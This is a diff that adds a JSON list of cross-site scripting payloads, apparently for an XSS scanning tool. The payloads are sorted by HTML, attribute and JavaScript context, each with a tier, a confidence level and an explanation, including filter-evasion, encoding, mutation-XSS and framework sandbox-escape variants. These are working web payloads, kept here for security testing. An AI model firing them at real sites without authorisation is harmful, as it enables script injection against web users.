@@ -1,0 +1,590 @@
+{
+    "html": [
+        {
+            "payload": "<script>alert(1)</script>",
+            "tier": "quick",
+            "confidence": "High",
+            "explanation": "Input reflected inside HTML body without escaping, allowing standard script tag execution."
+        },
+        {
+            "payload": "<img src=x onerror=alert(1)>",
+            "tier": "quick",
+            "confidence": "High",
+            "explanation": "Input reflected inside HTML body, allowing execution via image loading failure."
+        },
+        {
+            "payload": "<svg/onload=alert(1)>",
+            "tier": "quick",
+            "confidence": "Medium",
+            "explanation": "Input reflected inside HTML body; missing spaces bypasses basic WAF signatures."
+        },
+        {
+            "payload": "<ScRiPt>alert(1)</sCrIpT>",
+            "tier": "quick",
+            "confidence": "Medium",
+            "explanation": "Input reflected inside HTML body; mixed capitalization bypasses naive regex filters."
+        },
+        {
+            "payload": "</textarea><script>alert(1)</script>",
+            "tier": "quick",
+            "confidence": "High",
+            "explanation": "Input reflected inside a textarea; breaks out of the tag before executing payload."
+        },
+        {
+            "payload": "<script>eval(atob('YWxlcnQoMSk='))</script>",
+            "tier": "deep",
+            "confidence": "Low",
+            "explanation": "Input reflected inside HTML body; base64 payload evades keyword filtering."
+        },
+        {
+            "payload": "{{constructor.constructor('alert(1)')()}}",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected inside HTML body; breaks out of AngularJS template context."
+        },
+        {
+            "payload": "<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected inside HTML body; breaks out of Vue.js template context."
+        },
+        {
+            "payload": "<details open ontoggle=alert(1)>",
+            "tier": "deep",
+            "confidence": "High",
+            "explanation": "Input reflected inside HTML body; leverages HTML5 details tag event handlers."
+        },
+        {
+            "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
+            "tier": "deep",
+            "confidence": "Low",
+            "explanation": "Polyglot payload attempting to break out of multiple nested contexts simultaneously."
+        },
+        {
+            "payload": "<svg onload=alert(1)>",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "<body onload=alert(1)>",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "<iframe src=\"javascript:alert(1)\">",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "\"><svg/onload=alert(1)>",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "<marquee onstart=alert(1)>",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "<video><source onerror=alert(1)>",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "<audio src=x onerror=alert(1)>",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "<input autofocus onfocus=alert(1)>",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "<select autofocus onfocus=alert(1)>",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "<object data=\"javascript:alert(1)\">",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "<embed src=\"javascript:alert(1)\">",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "<img src=x onerror=alert&#40;1&#41;>",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "<svg><set onbegin=alert(1) attributeName=x to=1>",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "${alert(1)}",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "--><script>alert(1)</script>",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "<!--><script>alert(1)</script>-->",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "<style>@keyframes x{}</style><b style=\"animation-name:x\" onanimationend=\"alert(1)\"></b>",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in html context, bypassing naive filters."
+        },
+        {
+            "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+            "tier": "deep",
+            "confidence": "Low",
+            "explanation": "Mutation XSS (mXSS): Exploits browser parsing quirks to bypass DOM sanitizers like DOMPurify."
+        },
+        {
+            "payload": "<svg><style>{font-family:&quot;<style/onload=alert(1)>&quot;}</style></svg>",
+            "tier": "deep",
+            "confidence": "Low",
+            "explanation": "Mutation XSS (mXSS): Uses CSS inside SVG to confuse HTML parsers."
+        },
+        {
+            "payload": "{{$on.constructor('alert(1)')()}}",
+            "tier": "deep",
+            "confidence": "Low",
+            "explanation": "Deep Framework Injection: Alternative AngularJS sandbox escape."
+        },
+        {
+            "payload": "<div v-html=\"'\\x3cimg src=x onerror=alert(1)\\x3e'\"></div>",
+            "tier": "deep",
+            "confidence": "Low",
+            "explanation": "Deep Framework Injection: Vue.js v-html bypass using hex encoding."
+        },
+        {
+            "payload": "<iframe src=\"data:application/pdf;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Exotic URI/File Vector: Exploits PDF rendering to execute JavaScript."
+        },
+        {
+            "payload": "<object data=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=\"></object>",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Exotic URI/File Vector: Executes base64 encoded SVG payload inside an object tag."
+        }
+    ],
+    "attribute": [
+        {
+            "payload": "\" onmouseover=\"alert(1)",
+            "tier": "quick",
+            "confidence": "High",
+            "explanation": "Input reflected inside double-quoted attribute without escaping, allowing event handler injection."
+        },
+        {
+            "payload": "' onmouseover='alert(1)",
+            "tier": "quick",
+            "confidence": "High",
+            "explanation": "Input reflected inside single-quoted attribute without escaping, allowing event handler injection."
+        },
+        {
+            "payload": "\"><script>alert(1)</script>",
+            "tier": "quick",
+            "confidence": "High",
+            "explanation": "Input reflected inside attribute without escaping; breaks out of the element entirely."
+        },
+        {
+            "payload": "autofocus onfocus=alert(1)",
+            "tier": "quick",
+            "confidence": "Medium",
+            "explanation": "Input reflected inside unquoted attribute, leveraging autofocus for immediate execution."
+        },
+        {
+            "payload": "javascript:alert(1)",
+            "tier": "quick",
+            "confidence": "Medium",
+            "explanation": "Input reflected inside href/src attribute, executing as a javascript URI."
+        },
+        {
+            "payload": "x\" onmouseover=\"alert(1)\" y=\"",
+            "tier": "deep",
+            "confidence": "High",
+            "explanation": "Input reflected inside double-quoted attribute; balances quotes to avoid syntax errors."
+        },
+        {
+            "payload": "\" onfocus=\"alert(1)\" autofocus=\"",
+            "tier": "deep",
+            "confidence": "High",
+            "explanation": "Input reflected inside double-quoted attribute; forces focus for immediate execution."
+        },
+        {
+            "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected inside href/src attribute; loads base64 encoded HTML content."
+        },
+        {
+            "payload": "%22%20onmouseover%3D%22alert(1)",
+            "tier": "deep",
+            "confidence": "Low",
+            "explanation": "Input reflected inside attribute; URL-encoded payload evades basic filters before being decoded."
+        },
+        {
+            "payload": "&#34; onmouseover=&#34;alert(1)",
+            "tier": "deep",
+            "confidence": "Low",
+            "explanation": "Input reflected inside attribute; HTML-entity encoded payload evades filters before DOM rendering."
+        },
+        {
+            "payload": "\" onmouseenter=\"alert(1)",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in attribute context, bypassing naive filters."
+        },
+        {
+            "payload": "' onpointerenter='alert(1)",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in attribute context, bypassing naive filters."
+        },
+        {
+            "payload": "\" onauxclick=\"alert(1)",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in attribute context, bypassing naive filters."
+        },
+        {
+            "payload": "\"/onmouseover=\"alert(1)",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in attribute context, bypassing naive filters."
+        },
+        {
+            "payload": "' onfocus='alert(1)' autofocus='",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in attribute context, bypassing naive filters."
+        },
+        {
+            "payload": "\" onanimationend=\"alert(1)\" style=\"animation-name:x",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in attribute context, bypassing naive filters."
+        },
+        {
+            "payload": "\" ontransitionend=\"alert(1)\" style=\"transition:all 0.1s",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in attribute context, bypassing naive filters."
+        },
+        {
+            "payload": "\" ondblclick=\"alert(1)",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in attribute context, bypassing naive filters."
+        },
+        {
+            "payload": "\" oncontextmenu=\"alert(1)",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in attribute context, bypassing naive filters."
+        },
+        {
+            "payload": "&#x22;&#x20;onmouseover&#x3D;&#x22;alert(1)",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in attribute context, bypassing naive filters."
+        },
+        {
+            "payload": "\" onmouseover=\"alert(1)\" {{constructor.constructor('alert(1)')()}} x=\"",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in attribute context, bypassing naive filters."
+        },
+        {
+            "payload": "' onmouseover='alert(1)' v-on:click='alert(1)' x='",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in attribute context, bypassing naive filters."
+        },
+        {
+            "payload": "javascript:alert(1)//",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in attribute context, bypassing naive filters."
+        },
+        {
+            "payload": "data:text/html,%3Cscript%3Ealert(1)%3C/script%3E",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in attribute context, bypassing naive filters."
+        },
+        {
+            "payload": "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in attribute context, bypassing naive filters."
+        },
+        {
+            "payload": "\" onfocusin=\"alert(1)",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in attribute context, bypassing naive filters."
+        },
+        {
+            "payload": "' onfocusin='alert(1)",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in attribute context, bypassing naive filters."
+        },
+        {
+            "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+            "tier": "deep",
+            "confidence": "Low",
+            "explanation": "Advanced Polyglot: Escapes multiple contexts and relies on JavaScript URI execution."
+        },
+        {
+            "payload": "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Exotic URI/File Vector: Base64 encoded SVG used inside href/src attributes."
+        }
+    ],
+    "javascript": [
+        {
+            "payload": "\";alert(1);//",
+            "tier": "quick",
+            "confidence": "High",
+            "explanation": "Input reflected inside double-quoted JS string without escaping, allowing statement breakout."
+        },
+        {
+            "payload": "'-alert(1)-'",
+            "tier": "quick",
+            "confidence": "High",
+            "explanation": "Input reflected inside single-quoted JS string; uses subtraction to execute payload without semicolons."
+        },
+        {
+            "payload": "</script><script>alert(1)</script>",
+            "tier": "quick",
+            "confidence": "High",
+            "explanation": "Input reflected inside script block; breaks out of the script tag entirely."
+        },
+        {
+            "payload": "};alert(1);{",
+            "tier": "quick",
+            "confidence": "Medium",
+            "explanation": "Input reflected inside JS block; balances curly braces to maintain syntax validity."
+        },
+        {
+            "payload": "]-alert(1)-[",
+            "tier": "quick",
+            "confidence": "Medium",
+            "explanation": "Input reflected inside JS array; uses subtraction to execute payload."
+        },
+        {
+            "payload": "\\u0022;alert(1);//",
+            "tier": "deep",
+            "confidence": "Low",
+            "explanation": "Input reflected inside JS string; unicode-escaped quote evades simple quote filtering."
+        },
+        {
+            "payload": "\\x22;alert(1);//",
+            "tier": "deep",
+            "confidence": "Low",
+            "explanation": "Input reflected inside JS string; hex-escaped quote evades simple quote filtering."
+        },
+        {
+            "payload": "+alert(1)+",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected inside JS numeric/string context; uses addition operator to execute payload."
+        },
+        {
+            "payload": "});alert(1);({",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected inside JS object/function call; balances structure to maintain syntax."
+        },
+        {
+            "payload": "*/alert(1)/*",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected inside JS comment; breaks out of the comment block to execute."
+        },
+        {
+            "payload": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "\"-confirm(1)-\"",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "\");alert(1);//",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "\\'-alert(1)//",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "\\u0027;alert(1);//",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "\\x27-alert(1)-\\x27",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "'-confirm(1)-'",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "</script><svg/onload=alert(1)>",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "\\74script\\76alert(1)\\74/script\\76",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "${alert(1)}",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "`-alert(1)-`",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "{{constructor.constructor('alert(1)')()}}",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "\");alert(1);(\"",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "'-alert(1)//\\n",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "\"});alert(1);({\"",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "\";alert(String.fromCharCode(88,83,83));//",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "'/alert(1)//",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "</script><!--\\x3csvg/onload=alert(1)-->",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "Input reflected in javascript context, bypassing naive filters."
+        },
+        {
+            "payload": "'-alert(1)-'<svg/onload=alert(1)>",
+            "tier": "deep",
+            "confidence": "Medium",
+            "explanation": "mXSS/Context Breakout: Combines JS escape with SVG execution for robust breakout."
+        }
+    ]
+}
